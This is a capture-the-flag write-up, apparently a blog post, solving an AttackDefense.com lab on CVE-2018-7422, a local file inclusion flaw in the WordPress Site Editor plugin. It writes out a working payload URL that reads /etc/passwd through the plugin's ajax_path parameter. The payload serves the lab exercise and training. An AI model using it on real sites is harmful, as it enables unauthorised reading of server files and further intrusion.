---
layout: post
title: AttackDefense.com [LFI] - CVE-2018-7422 Exploit
date: 2018-11-11 18:57 -0300
categories: [AttackDefense.com, ctf, writeups, LFI]
tags: [ writeups, CTF,  challange, AttackDefense.com]
---

![Image of AttackDefense 2018](/uploads/Screenshot from 2018-10-26 17-44-27.png)

### Mission

The attacker might not have any user level access to the web application. However, this does not mean that the application cannot be attacked remotely. Local File Inclusion vulnerabilities could be triggered even by unauthenticated users.

In the exercise below, the attacker is unauthenticated to the web application and needs to find a local file inclusion attack to access sensitive files from the server.

WordPress is a free and open source full-featured CMS for hosting blogs and web portals. It is based on PHP and MySQL. It is one of the most popular CMS.

WordPress Site Editor Plugin (1.1.1) is vulnerable to Local File Inclusion documented in CVE-2018-7422.

Objective: Your task is to find and exploit this vulnerability.

Level difficulty: Easy

Category: Webapps CVEs > Local File Inclusion

### Solution

The lab started with a real copy of a default WordPress installation with one additional plugin which is vulnerable to Local File Inclusion.

![Image of AttackDefense 2018](/uploads/adlfi1/image2.png)

After searching on the internet for ```CVE-2018-7422``` exploits I have discovered the following resource:

- [https://www.exploit-db.com/exploits/44340/](https://www.exploit-db.com/exploits/44340/)

![Image of AttackDefense 2018](/uploads/adlfi1/image4.png)

In order to retrieve the ```/etc/passwd``` file contents, I used the following payload:

- [http://mvwv0w4bnljuakkri3kmb3u32.public2.attackdefenselabs.com/wp-content/plugins/site-editor/editor/extensions/pagebuilder/includes/ajax_shortcode_pattern.php?ajax_path=/etc/passwd](http://mvwv0w4bnljuakkri3kmb3u32.public2.attackdefenselabs.com/wp-content/plugins/site-editor/editor/extensions/pagebuilder/includes/ajax_shortcode_pattern.php?ajax_path=/etc/passwd)

![Image of AttackDefense 2018](/uploads/adlfi1/image3.png)

![Image of AttackDefense 2018](/uploads/adlfi1/image1.png)

